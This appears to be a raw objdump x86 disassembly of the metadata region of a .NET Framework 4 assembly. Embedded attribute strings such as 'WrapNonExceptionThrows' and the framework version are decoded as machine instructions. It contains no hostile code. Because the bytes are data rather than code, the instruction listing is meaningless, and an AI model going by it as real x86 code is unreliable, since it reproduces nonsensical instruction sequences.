  40c99d:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9a0:	01 02                	add    %eax,(%edx)
  40c9a2:	0e                   	push   %cs
  40c9a3:	03 20                	add    (%eax),%esp
  40c9a5:	00 0e                	add    %cl,(%esi)
  40c9a7:	04 20                	add    $0x20,%al
  40c9a9:	01 01                	add    %eax,(%ecx)
  40c9ab:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9ae:	01 01                	add    %eax,(%ecx)
  40c9b0:	0c 04                	or     $0x4,%al
  40c9b2:	20 01                	and    %al,(%ecx)
  40c9b4:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9ba:	5c                   	pop    %esp
  40c9bb:	04 20                	add    $0x20,%al
  40c9bd:	00 11                	add    %dl,(%ecx)
  40c9bf:	64 04 20             	fs add $0x20,%al
  40c9c2:	00 12                	add    %dl,(%edx)
  40c9c4:	59                   	pop    %ecx
  40c9c5:	03 28                	add    (%eax),%ebp
  40c9c7:	00 0e                	add    %cl,(%esi)
  40c9c9:	03 28                	add    (%eax),%ebp
  40c9cb:	00 0a                	add    %cl,(%edx)
  40c9cd:	03 28                	add    (%eax),%ebp
  40c9cf:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c9d5:	5c                   	pop    %esp
  40c9d6:	04 28                	add    $0x28,%al
  40c9d8:	00 11                	add    %dl,(%ecx)
  40c9da:	64 04 00             	fs add $0x0,%al
  40c9dd:	00 00                	add    %al,(%eax)
  40c9df:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c9e2:	00 00                	add    %al,(%eax)
  40c9e4:	00 04 04             	add    %al,(%esp,%eax,1)
  40c9e7:	00 00                	add    %al,(%eax)
  40c9e9:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c9f0:	06                   	push   %es
  40c9f1:	00 00                	add    %al,(%eax)
  40c9f3:	00 04 07             	add    %al,(%edi,%eax,1)
  40c9f6:	00 00                	add    %al,(%eax)
  40c9f8:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c9fb:	00 00                	add    %al,(%eax)
  40c9fd:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca00:	00 00                	add    %al,(%eax)
  40ca02:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca05:	00 00                	add    %al,(%eax)
  40ca07:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca0a:	00 00                	add    %al,(%eax)
  40ca0c:	00 06                	add    %al,(%esi)
  40ca0e:	00 02                	add    %al,(%edx)
  40ca10:	0e                   	push   %cs
  40ca11:	12 61 08             	adc    0x8(%ecx),%ah
  40ca14:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca19:	61                   	popa
  40ca1a:	06                   	push   %es
  40ca1b:	00 02                	add    %al,(%edx)
  40ca1d:	0e                   	push   %cs
  40ca1e:	05 12 61 05 00       	add    $0x56112,%eax
  40ca23:	01 01                	add    %eax,(%ecx)
  40ca25:	12 61 06             	adc    0x6(%ecx),%ah
  40ca28:	00 02                	add    %al,(%edx)
  40ca2a:	01 12                	add    %edx,(%edx)
  40ca2c:	61                   	popa
  40ca2d:	0e                   	push   %cs
  40ca2e:	07                   	pop    %es
  40ca2f:	00 02                	add    %al,(%edx)
  40ca31:	01 12                	add    %edx,(%edx)
  40ca33:	61                   	popa
  40ca34:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca39:	01 12                	add    %edx,(%edx)
  40ca3b:	61                   	popa
  40ca3c:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca41:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca44:	06                   	push   %es
  40ca45:	00 02                	add    %al,(%edx)
  40ca47:	01 12                	add    %edx,(%edx)
  40ca49:	61                   	popa
  40ca4a:	02 06                	add    (%esi),%al
  40ca4c:	00 02                	add    %al,(%edx)
  40ca4e:	01 12                	add    %edx,(%edx)
  40ca50:	61                   	popa
  40ca51:	0b 06                	or     (%esi),%eax
  40ca53:	00 02                	add    %al,(%edx)
  40ca55:	01 12                	add    %edx,(%edx)
  40ca57:	61                   	popa
  40ca58:	0a 03                	or     (%ebx),%al
  40ca5a:	06                   	push   %es
  40ca5b:	11 78 04             	adc    %edi,0x4(%eax)
  40ca5e:	20 01                	and    %al,(%ecx)
  40ca60:	01 08                	add    %ecx,(%eax)
  40ca62:	08 01                	or     %al,(%ecx)
  40ca64:	00 08                	add    %cl,(%eax)
  40ca66:	00 00                	add    %al,(%eax)
  40ca68:	00 00                	add    %al,(%eax)
  40ca6a:	00 1e                	add    %bl,(%esi)
  40ca6c:	01 00                	add    %eax,(%eax)
  40ca6e:	01 00                	add    %eax,(%eax)
  40ca70:	54                   	push   %esp
  40ca71:	02 16                	add    (%esi),%dl
  40ca73:	57                   	push   %edi
  40ca74:	72 61                	jb     0x40cad7
  40ca76:	70 4e                	jo     0x40cac6
  40ca78:	6f                   	outsl  %ds:(%esi),(%dx)
  40ca79:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca7a:	45                   	inc    %ebp
  40ca7b:	78 63                	js     0x40cae0
  40ca7d:	65 70 74             	gs jo  0x40caf4
  40ca80:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40ca87:	77 73                	ja     0x40cafc
  40ca89:	01 05 20 01 01 11    	add    %eax,0x11010120
  40ca8f:	71 08                	jno    0x40ca99
  40ca91:	01 00                	add    %eax,(%eax)
  40ca93:	02 00                	add    (%eax),%al
  40ca95:	00 00                	add    %al,(%eax)
  40ca97:	00 00                	add    %al,(%eax)
  40ca99:	05 01 00 00 00       	add    $0x1,%eax
  40ca9e:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40caa1:	00 07                	add    %al,(%edi)
  40caa3:	31 2e                	xor    %ebp,(%esi)
  40caa5:	30 2e                	xor    %ch,(%esi)
  40caa7:	30 2e                	xor    %ch,(%esi)
  40caa9:	30 00                	xor    %al,(%eax)
  40caab:	00 65 01             	add    %ah,0x1(%ebp)
  40caae:	00 29                	add    %ch,(%ecx)
  40cab0:	2e 4e                	cs dec %esi
  40cab2:	45                   	inc    %ebp
  40cab3:	54                   	push   %esp
  40cab4:	46                   	inc    %esi
  40cab5:	72 61                	jb     0x40cb18
  40cab7:	6d                   	insl   (%dx),%es:(%edi)
  40cab8:	65 77 6f             	gs ja  0x40cb2a
  40cabb:	72 6b                	jb     0x40cb28
  40cabd:	2c 56                	sub    $0x56,%al
  40cabf:	65 72 73             	gs jb  0x40cb35
  40cac2:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cac9:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40cacc:	72 6f                	jb     0x40cb3d
  40cace:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cad5:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cadc:	0e                   	push   %cs
  40cadd:	14 46                	adc    $0x46,%al
  40cadf:	72 61                	jb     0x40cb42
  40cae1:	6d                   	insl   (%dx),%es:(%edi)
  40cae2:	65 77 6f             	gs ja  0x40cb54
  40cae5:	72 6b                	jb     0x40cb52
  40cae7:	44                   	inc    %esp
  40cae8:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40caef:	61                   	popa
  40caf0:	6d                   	insl   (%dx),%es:(%edi)
  40caf1:	65 1f                	gs pop %ds
  40caf3:	2e 4e                	cs dec %esi
  40caf5:	45                   	inc    %ebp
  40caf6:	54                   	push   %esp
  40caf7:	20 46 72             	and    %al,0x72(%esi)
  40cafa:	61                   	popa
  40cafb:	6d                   	insl   (%dx),%es:(%edi)
  40cafc:	65 77 6f             	gs ja  0x40cb6e
  40caff:	72 6b                	jb     0x40cb6c
  40cb01:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb04:	43                   	inc    %ebx
  40cb05:	6c                   	insb   (%dx),%es:(%edi)
  40cb06:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb0d:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb0e:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb15:	04 49                	add    $0x49,%al
  40cb17:	74 65                	je     0x40cb7e
  40cb19:	6d                   	insl   (%dx),%es:(%edi)
  40cb1a:	00 00                	add    %al,(%eax)
  40cb1c:	03 07                	add    (%edi),%eax
  40cb1e:	01 08                	add    %ecx,(%eax)
  40cb20:	04 00                	add    $0x0,%al
  40cb22:	01 08                	add    %ecx,(%eax)
  40cb24:	0e                   	push   %cs
  40cb25:	03 07                	add    (%edi),%eax
  40cb27:	01 02                	add    %eax,(%edx)
  40cb29:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb2e:	b1 05                	mov    $0x5,%cl
  40cb30:	20 01                	and    %al,(%ecx)
  40cb32:	0e                   	push   %cs
  40cb33:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb38:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb3e:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb44:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb49:	03 02                	add    (%edx),%eax
  40cb4b:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb50:	14 07                	adc    $0x7,%al
  40cb52:	08 0e                	or     %cl,(%esi)
  40cb54:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb5a:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb60:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb66:	20 03                	and    %al,(%ebx)
  40cb68:	01 11                	add    %edx,(%ecx)
  40cb6a:	80 d5 11             	adc    $0x11,%ch
  40cb6d:	80 d9 11             	sbb    $0x11,%cl
  40cb70:	80 dd 05             	sbb    $0x5,%ch
  40cb73:	00 02                	add    %al,(%edx)
  40cb75:	02 0e                	add    (%esi),%cl
  40cb77:	0e                   	push   %cs
  40cb78:	06                   	push   %es
  40cb79:	20 01                	and    %al,(%ecx)
  40cb7b:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cb80:	20 01                	and    %al,(%ecx)
  40cb82:	08 08                	or     %cl,(%eax)
  40cb84:	07                   	pop    %es
  40cb85:	00 01                	add    %al,(%ecx)
  40cb87:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cb8c:	07                   	pop    %es
  40cb8d:	20 02                	and    %al,(%edx)
  40cb8f:	01 12                	add    %edx,(%edx)
  40cb91:	80 c9 08             	or     $0x8,%cl
  40cb94:	06                   	push   %es
  40cb95:	20 01                	and    %al,(%ecx)
  40cb97:	01 12                	add    %edx,(%edx)
  40cb99:	80 f1 09             	xor    $0x9,%cl
  40cb9c:	20 02                	and    %al,(%edx)
  40cb9e:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cba3:	80 f5 05             	xor    $0x5,%ch
  40cba6:	20 02                	and    %al,(%edx)
  40cba8:	08 08                	or     %cl,(%eax)
  40cbaa:	08 06                	or     %al,(%esi)
  40cbac:	20 02                	and    %al,(%edx)
  40cbae:	01 12                	add    %edx,(%edx)
  40cbb0:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbb5:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbb8:	09 20                	or     %esp,(%eax)
  40cbba:	03 01                	add    (%ecx),%eax
  40cbbc:	12 61 02             	adc    0x2(%ecx),%ah
  40cbbf:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbc5:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cbcb:	01 0e                	add    %ecx,(%esi)
  40cbcd:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cbd3:	02 09                	add    (%ecx),%cl
  40cbd5:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cbd8:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cbde:	0c 20                	or     $0x20,%al
  40cbe0:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cbe5:	08 08                	or     %cl,(%eax)
  40cbe7:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cbed:	01 11                	add    %edx,(%ecx)
  40cbef:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cbf5:	02 12                	add    (%edx),%dl
  40cbf7:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cbfa:	02 08                	add    (%eax),%cl
  40cbfc:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc02:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc07:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc0c:	03 08                	add    (%eax),%ecx
  40cc0e:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc13:	20 01                	and    %al,(%ecx)
  40cc15:	01 12                	add    %edx,(%edx)
  40cc17:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc1d:	1c 0c                	sbb    $0xc,%al
  40cc1f:	07                   	pop    %es
  40cc20:	06                   	push   %es
  40cc21:	1c 02                	sbb    $0x2,%al
  40cc23:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc28:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc2e:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc31:	02 07                	add    (%edi),%al
  40cc33:	20 02                	and    %al,(%edx)
  40cc35:	02 08                	add    (%eax),%cl
  40cc37:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc3d:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc43:	07                   	pop    %es
  40cc44:	0a 12                	or     (%edx),%dl
  40cc46:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc4d:	08 12 81 
  40cc50:	41                   	inc    %ecx
  40cc51:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc57:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc5c:	4d                   	dec    %ebp
  40cc5d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc62:	0e                   	push   %cs
  40cc63:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc68:	41                   	inc    %ecx
  40cc69:	05 20 00 12 81       	add    $0x81120020,%eax
  40cc6e:	55                   	push   %ebp
  40cc6f:	06                   	push   %es
  40cc70:	00 00                	add    %al,(%eax)
  40cc72:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc77:	00 01                	add    %al,(%ecx)
  40cc79:	0e                   	push   %cs
  40cc7a:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cc7f:	01 11                	add    %edx,(%ecx)
  40cc81:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40cc88:	41                   	inc    %ecx
  40cc89:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40cc8f:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40cc96:	49                   	dec    %ecx
  40cc97:	0e                   	push   %cs
  40cc98:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40cc9e:	0e                   	push   %cs
  40cc9f:	0e                   	push   %cs
  40cca0:	0e                   	push   %cs
  40cca1:	0e                   	push   %cs
  40cca2:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cca7:	1c 07                	sbb    $0x7,%al
  40cca9:	20 02                	and    %al,(%edx)
  40ccab:	01 0e                	add    %ecx,(%esi)
  40ccad:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccb3:	0a 02                	or     (%edx),%al
  40ccb5:	10 07                	adc    %al,(%edi)
  40ccb7:	06                   	push   %es
  40ccb8:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40ccbe:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccc4:	0e                   	push   %cs
  40ccc5:	02 05 20 00 12 81    	add    0x81120020,%al
  40cccb:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40ccd1:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40ccd7:	91                   	xchg   %eax,%ecx
  40ccd8:	04 20                	add    $0x20,%al
  40ccda:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40ccdd:	04 07                	add    $0x7,%al
  40ccdf:	02 02                	add    (%edx),%al
  40cce1:	02 03                	add    (%ebx),%al
  40cce3:	20 00                	and    %al,(%eax)
  40cce5:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cce8:	02 18                	add    (%eax),%bl
  40ccea:	02 03                	add    (%ebx),%al
  40ccec:	07                   	pop    %es
  40cced:	01 0e                	add    %ecx,(%esi)
  40ccef:	05 00 00 12 81       	add    $0x81120000,%eax
  40ccf4:	9d                   	popf
  40ccf5:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40ccfa:	1c 0a                	sbb    $0xa,%al
  40ccfc:	07                   	pop    %es
  40ccfd:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd02:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd07:	20 01                	and    %al,(%ecx)
  40cd09:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd0f:	0e                   	push   %cs
  40cd10:	08 08                	or     %cl,(%eax)
  40cd12:	06                   	push   %es
  40cd13:	07                   	pop    %es
  40cd14:	02 02                	add    (%edx),%al
  40cd16:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd1c:	0e                   	push   %cs
  40cd1d:	0e                   	push   %cs
  40cd1e:	0e                   	push   %cs
  40cd1f:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd24:	ad                   	lods   %ds:(%esi),%eax
  40cd25:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd2a:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd2f:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd35:	02 11                	add    (%ecx),%dl
  40cd37:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd3d:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd44:	12 81 8d 
  40cd47:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd4d:	12 41 01             	adc    0x1(%ecx),%al
  40cd50:	0e                   	push   %cs
  40cd51:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd56:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd5c:	00 06                	add    %al,(%esi)
  40cd5e:	00 02                	add    %al,(%edx)
  40cd60:	0e                   	push   %cs
  40cd61:	0e                   	push   %cs
  40cd62:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd67:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cd6c:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cd72:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cd78:	c5 09                	lds    (%ecx),%ecx
  40cd7a:	00 02                	add    %al,(%edx)
  40cd7c:	02 11                	add    (%ecx),%dl
  40cd7e:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cd84:	07                   	pop    %es
  40cd85:	02 12                	add    (%edx),%dl
  40cd87:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cd8c:	01 02                	add    %eax,(%edx)
  40cd8e:	0e                   	push   %cs
  40cd8f:	10 02                	adc    %al,(%edx)
  40cd91:	06                   	push   %es
  40cd92:	00 01                	add    %al,(%ecx)
  40cd94:	01 12                	add    %edx,(%edx)
  40cd96:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cd9c:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cda3:	0e                   	push   %cs
  40cda4:	1c 11                	sbb    $0x11,%al
  40cda6:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdac:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cdb3:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cdb9:	05 07 20 02 12       	add    $0x12022007,%eax
  40cdbe:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cdc5:	12 60 0e             	adc    0xe(%eax),%ah
  40cdc8:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cdcd:	12 60 12             	adc    0x12(%eax),%ah
  40cdd0:	60                   	pusha
  40cdd1:	06                   	push   %es
  40cdd2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cdd7:	60                   	pusha
  40cdd8:	10 10                	adc    %dl,(%eax)
  40cdda:	01 01                	add    %eax,(%ecx)
  40cddc:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40cde1:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40cde7:	1e                   	push   %ds
  40cde8:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cdeb:	01 12                	add    %edx,(%edx)
  40cded:	60                   	pusha
  40cdee:	09 20                	or     %esp,(%eax)
  40cdf0:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40cdf6:	13 00                	adc    (%eax),%eax
  40cdf8:	07                   	pop    %es
  40cdf9:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cdfe:	12 60 04             	adc    0x4(%eax),%ah
  40ce01:	20 00                	and    %al,(%eax)
  40ce03:	13 00                	adc    (%eax),%eax
  40ce05:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce0a:	00 03                	add    %al,(%ebx)
  40ce0c:	07                   	pop    %es
  40ce0d:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce14:	e5 07                	in     $0x7,%eax
  40ce16:	20 01                	and    %al,(%ecx)
  40ce18:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce1e:	20 01                	and    %al,(%ecx)
  40ce20:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce26:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce29:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce2f:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce35:	00 02                	add    %al,(%edx)
  40ce37:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce3d:	0e                   	push   %cs
  40ce3e:	1c 00                	sbb    $0x0,%al
  40ce40:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce45:	82 09 0e             	orb    $0xe,(%ecx)
  40ce48:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce4d:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce53:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce58:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce5e:	45                   	inc    %ebp
  40ce5f:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce65:	4d                   	dec    %ebp
  40ce66:	1c 12                	sbb    $0x12,%al
  40ce68:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce6d:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce72:	0e                   	push   %cs
  40ce73:	0b 00                	or     (%eax),%eax
  40ce75:	01 15 12 45 01 13    	add    %edx,0x13014512
  40ce7b:	00 12                	add    %dl,(%edx)
  40ce7d:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ce84:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ce89:	4d                   	dec    %ebp
  40ce8a:	1c 12                	sbb    $0x12,%al
  40ce8c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce91:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce96:	0e                   	push   %cs
  40ce97:	17                   	pop    %ss
  40ce98:	20 0a                	and    %cl,(%edx)
  40ce9a:	01 13                	add    %edx,(%ebx)
  40ce9c:	00 13                	add    %dl,(%ebx)
  40ce9e:	01 13                	add    %edx,(%ebx)
  40cea0:	02 13                	add    (%ebx),%dl
  40cea2:	03 13                	add    (%ebx),%edx
  40cea4:	04 13                	add    $0x13,%al
  40cea6:	05 13 06 13 07       	add    $0x7130613,%eax
  40ceab:	13 08                	adc    (%eax),%ecx
  40cead:	13 09                	adc    (%ecx),%ecx
  40ceaf:	05 07 01 12 82       	add    $0x82120107,%eax
  40ceb4:	0d 07 20 03 01       	or     $0x1032007,%eax
  40ceb9:	0e                   	push   %cs
  40ceba:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cebf:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cec5:	06                   	push   %es
  40cec6:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cecc:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40ced2:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40ced7:	20 01                	and    %al,(%ecx)
  40ced9:	01 11                	add    %edx,(%ecx)
  40cedb:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cee2:	82 31 05             	xorb   $0x5,(%ecx)
  40cee5:	20 00                	and    %al,(%eax)
  40cee7:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40ceed:	01 12                	add    %edx,(%edx)
  40ceef:	61                   	popa
  40cef0:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cef6:	08 20                	or     %ah,(%eax)
  40cef8:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cefe:	08 1a                	or     %bl,(%edx)
  40cf00:	07                   	pop    %es
  40cf01:	0a 12                	or     (%edx),%dl
  40cf03:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf0a:	21 1d 05 
  40cf0d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf12:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf19:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf1e:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf24:	45                   	inc    %ebp
  40cf25:	08 08                	or     %cl,(%eax)
  40cf27:	04 07                	add    $0x7,%al
  40cf29:	02 02                	add    (%edx),%al
  40cf2b:	08 09                	or     %cl,(%ecx)
  40cf2d:	00 02                	add    %al,(%edx)
  40cf2f:	01 12                	add    %edx,(%edx)
  40cf31:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf35:	4d                   	dec    %ebp
  40cf36:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf3b:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf41:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf46:	02 12                	add    (%edx),%dl
  40cf48:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf4c:	08 07                	or     %al,(%edi)
  40cf4e:	04 12                	add    $0x12,%al
  40cf50:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf55:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf5a:	1c 06                	sbb    $0x6,%al
  40cf5c:	07                   	pop    %es
  40cf5d:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cf63:	20 01                	and    %al,(%ecx)
  40cf65:	13 00                	adc    (%eax),%eax
  40cf67:	08 04 07             	or     %al,(%edi,%eax,1)
  40cf6a:	01 12                	add    %edx,(%edx)
  40cf6c:	60                   	pusha
  40cf6d:	0e                   	push   %cs
  40cf6e:	07                   	pop    %es
  40cf6f:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf74:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cf7a:	12 60 07             	adc    0x7(%eax),%ah
  40cf7d:	07                   	pop    %es
  40cf7e:	04 08                	add    $0x8,%al
  40cf80:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cf85:	20 01                	and    %al,(%ecx)
  40cf87:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cf8d:	64 04 00             	fs add $0x0,%al
  40cf90:	01 0b                	add    %ecx,(%ebx)
  40cf92:	0a 04 00             	or     (%eax,%eax,1),%al
  40cf95:	01 0b                	add    %ecx,(%ebx)
  40cf97:	0e                   	push   %cs
  40cf98:	04 00                	add    $0x0,%al
  40cf9a:	01 0b                	add    %ecx,(%ebx)
  40cf9c:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfa1:	0c 06                	or     $0x6,%al
  40cfa3:	00 01                	add    %al,(%ecx)
  40cfa5:	0b 11                	or     (%ecx),%edx
  40cfa7:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfae:	04 00 01 
  40cfb1:	0a 0e                	or     (%esi),%cl
  40cfb3:	04 00                	add    $0x0,%al
  40cfb5:	01 0a                	add    %ecx,(%edx)
  40cfb7:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cfbc:	0c 06                	or     $0x6,%al
  40cfbe:	00 01                	add    %al,(%ecx)
  40cfc0:	0a 11                	or     (%ecx),%dl
  40cfc2:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cfc9:	04 00 01 
  40cfcc:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cfd1:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cfd5:	ad                   	lods   %ds:(%esi),%eax
  40cfd6:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40cfdb:	0c 07                	or     $0x7,%al
  40cfdd:	07                   	pop    %es
  40cfde:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40cfe4:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40cfe9:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
